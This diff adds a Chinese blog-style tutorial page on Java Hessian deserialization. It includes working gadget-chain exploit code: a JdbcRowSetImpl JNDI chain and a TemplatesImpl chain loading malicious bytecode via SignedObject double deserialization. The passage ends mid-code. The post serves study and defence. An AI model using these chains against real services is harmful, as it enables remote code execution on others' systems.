@@ -1,0 +1,871 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Hessian反序列化前言这个hessian反序列化和其他的反序列化有点不同， 这里就是序列化和反序列化不用ObjectOutputStream和ObjectInputStream 改为使用对应的Hessian或Hessian2 import com.caucho.hessian.io.Hessian2Input; import com.caucho.hessian.io.Hessian2Outp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hessian反序列化">
+<meta property="og:url" content="https://zer0peach.github.io/2024/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="Hessian反序列化前言这个hessian反序列化和其他的反序列化有点不同， 这里就是序列化和反序列化不用ObjectOutputStream和ObjectInputStream 改为使用对应的Hessian或Hessian2 import com.caucho.hessian.io.Hessian2Input; import com.caucho.hessian.io.Hessian2Outp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303220756669.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303222606860.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223332590.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223907161.png">
+<meta property="article:published_time" content="2024-03-03T12:29:50.000Z">
+<meta property="article:modified_time" content="2024-03-03T15:14:11.801Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303220756669.png">
+  
+  
+  
+  <title>Hessian反序列化 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hessian反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-03 20:29" pubdate>
+          2024年3月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          66 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Hessian反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个hessian反序列化和其他的反序列化有点不同，</p>
+<p>这里就是序列化和反序列化不用<code>ObjectOutputStream</code>和<code>ObjectInputStream</code></p>
+<p>改为使用对应的Hessian或Hessian2</p>
+<div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.Hessian2Input;
+<span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.Hessian2Output;
+<span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.HessianInput;
+<span class="hljs-keyword">import</span> com.caucho.hessian.<span class="hljs-built_in">io</span>.HessianOutput;</code></pre></div>
+
+
+
+<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hessian<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.66<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+
+
+
+
+<h2 id="原生hessian反序列化链"><a href="#原生hessian反序列化链" class="headerlink" title="原生hessian反序列化链"></a>原生hessian反序列化链</h2><p>反序列化对象最外层是HashMap时</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HessianInput</span>.</span></span>readObject
+	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SerializeFactory</span>.</span></span>readMap
+        _hashMapDeserializer = <span class="hljs-keyword">new</span> <span class="hljs-constructor">MapDeserializer(HashMap.<span class="hljs-params">class</span>)</span>;
+        return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_hashMapDeserializer</span>.</span></span>read<span class="hljs-constructor">Map(<span class="hljs-params">in</span>)</span>;
+        	map.put(<span class="hljs-keyword">in</span>.read<span class="hljs-constructor">Object()</span>, <span class="hljs-keyword">in</span>.read<span class="hljs-constructor">Object()</span>); <span class="hljs-comment">//入口就在这里</span></code></pre></div>
+
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Hessian;
+
+<span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;
+<span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;
+<span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;
+<span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;
+<span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;
+<span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;
+<span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;
+<span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;
+<span class="hljs-keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;
+
+
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
+<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
+<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.Serializable;
+<span class="hljs-keyword">import</span> java.lang.reflect.*;
+<span class="hljs-keyword">import</span> java.nio.file.Files;
+<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<span class="hljs-keyword">import</span> java.security.*;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.PriorityQueue;
+<span class="hljs-keyword">import</span> java.util.Queue;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+
+        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();
+        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://localhost:1099/exp&quot;</span>;
+        jdbcRowSet.setDataSourceName(url);
+
+
+        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);
+        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);
+
+        <span class="hljs-comment">//手动生成HashMap，防止提前调用hashcode()</span>
+        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(equalsBean,<span class="hljs-string">&quot;1&quot;</span>);
+
+        <span class="hljs-type">byte</span>[] s = serialize(hashMap);
+        System.out.println(s);
+        System.out.println((HashMap)deserialize(s));
+
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">( Object v1, Object v2 )</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
+        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);
+        Class&lt;?&gt; nodeC;
+        <span class="hljs-keyword">try</span> &#123;
+            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);
+        &#125;
+        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;
+            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);
+        &#125;
+        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(<span class="hljs-literal">true</span>);
+
+        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);
+        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));
+        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));
+        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);
+        <span class="hljs-keyword">return</span> s;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o)<span class="hljs-keyword">throws</span> IOException&#123;
+        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);
+        output.writeObject(o);
+        output.close();
+        System.out.println(bao.toString());
+        <span class="hljs-keyword">return</span> bao.toByteArray();
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><span class="hljs-keyword">throws</span> IOException&#123;
+        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);
+        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(stream);
+        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();
+        <span class="hljs-keyword">return</span> (T) o;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String name,Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        field.set(obj, value);
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj,String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);
+        field.setAccessible(<span class="hljs-literal">true</span>);
+        <span class="hljs-keyword">return</span> field.get(obj);
+    &#125;
+
+&#125;</code></pre></div>
+
+<p>这样看起来好像和普通的使用<code>ObjectOutputStream</code>没什么区别</p>
+<p>那下面这条链子区别就来了</p>
+<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>这是我们最经常使用的一个类</p>
+<p>先说结果，直接用<code>HessianInput</code>到<code>TemplatesImpl</code>的链子是无法使用的</p>
+<p>要使用jdk原生反序列化即<code>ObjectInputStream</code>才可以</p>
+<p>因为<code>TemplateImpl</code>的<code>readObject</code>的最后一行有<code>_tfactory = new TransformerFactoryImpl();</code></p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>但就<code>_tfactory </code>来说，他被<code>transient</code>修饰，无法通过序列化和反序列化传递数据</p>
+<p>但是<code>TemplatesImpl</code>能使用的前提之一就是<code>_tfactory </code>的值为<code>new TransformerFactoryImpl();</code></p>
+<p>我拿任意一个jackson链子下断点分析</p>
+<p>断点就下在<code>_tfactory = new TransformerFactoryImpl();</code>这里</p>
+<p>先看正常的<code>ObjectInputStream</code></p>
+<p>然后就往前看调用栈，这里说不了什么，只能看代码</p>
+<p>可以看到这三个调用栈调用了7次（不同链子不同</p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303220756669.png" srcset="/img/loading.gif" lazyload alt="image-20240303220756669"></p>
+<p>看完这三处的代码后可以知道，大概逻辑就是判断你的类有没有readObject方法，如果有则执行</p>
+<p>并且他会判断你所有实例化的类，所以这里才调用了7次（按链条顺序依次判断</p>
+<p>也就是走到了<code>TemplatesImpl</code>的readObject的方法并把<code>_tfactory </code>的值赋值为<code>new TransformerFactoryImpl();</code></p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303222606860.png" srcset="/img/loading.gif" lazyload alt="image-20240303222606860"></p>
+<p>要是使用<code>HessianInput</code>的话就不会经过这里</p>
+<p>导致最后要执行的<code>TemplatesImpl</code>对象的<code>_tfactory</code>仍为null，导致payload无法执行</p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223332590.png" srcset="/img/loading.gif" lazyload alt="image-20240303223332590"></p>
+<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>利用SignedObject进行二次反序列化即可</p>
+<p>因为他会利用<code>ObjectInputStream</code>再次进行反序列化</p>
+<p><img src="/../images/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240303223907161.png" srcset="/img/loading.gif" lazyload alt="image-20240303223907161"></p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> test &#123;
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+
+        Templates templatesimpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;
+
+        byte<span class="hljs-literal">[]</span> bytecodes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class&quot;</span>)</span>);
+        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>)</span>;
+        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;
+        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);
+
+        Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span>;
+        Constructor&lt;?&gt; cons = clazz.get<span class="hljs-constructor">DeclaredConstructor(AdvisedSupport.<span class="hljs-params">class</span>)</span>;
+        cons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        AdvisedSupport advisedSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AdvisedSupport()</span>;
+        advisedSupport.set<span class="hljs-constructor">Target(<span class="hljs-params">templatesimpl</span>)</span>;
+        InvocationHandler handler = (InvocationHandler) cons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">advisedSupport</span>)</span>;
+        Templates proxyObj = (Templates) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">clazz</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Templates</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);
+
+        POJONode jsonNodes2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">proxyObj</span>)</span>;
+
+        BadAttributeValueExpException exp2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BadAttributeValueExpException(<span class="hljs-params">null</span>)</span>;
+        Field val2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;val&quot;</span>)</span>;
+        val2.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        val2.set(exp2,jsonNodes2);
+
+        KeyPairGenerator keyPairGenerator;
+        keyPairGenerator = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">KeyPairGenerator</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;
+        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);
+        KeyPair keyPair = keyPairGenerator.gen<span class="hljs-constructor">KeyPair()</span>;
+        PrivateKey privateKey = keyPair.get<span class="hljs-constructor">Private()</span>;
+        Signature signingEngine = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Signature</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;DSA&quot;</span>)</span>;
+        SignedObject signedObject = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SignedObject(<span class="hljs-params">exp2</span>,<span class="hljs-params">privateKey</span>,<span class="hljs-params">signingEngine</span>)</span>;
+
+        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">signedObject</span>)</span>;
+
+        HotSwappableTargetSource h1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">jsonNodes</span>)</span>;
+        HotSwappableTargetSource h2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">new</span> XString(<span class="hljs-params">null</span>)</span>);
+
+        HashMap&lt;Object, Object&gt; objectObjectHashMap = make<span class="hljs-constructor">Map(<span class="hljs-params">h1</span>, <span class="hljs-params">h2</span>)</span>;
+        deserialize(serialize(objectObjectHashMap));
+
+
+    &#125;
+    public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception &#123;
+        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;
+        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;
+        Class&lt;?&gt; nodeC;
+        <span class="hljs-keyword">try</span> &#123;
+            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;
+        &#125;
+        catch ( ClassNotFoundException e ) &#123;
+            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;
+        &#125;
+        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;
+        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+
+        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-params">v1</span>, <span class="hljs-params">null</span>)</span>);
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-params">v2</span>, <span class="hljs-params">null</span>)</span>);
+        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;
+        return s;
+    &#125;
+    public static &lt;T&gt; byte<span class="hljs-literal">[]</span> serialize(T o)throws IOException&#123;
+        ByteArrayOutputStream bao = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+        HessianOutput output = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HessianOutput(<span class="hljs-params">bao</span>)</span>;
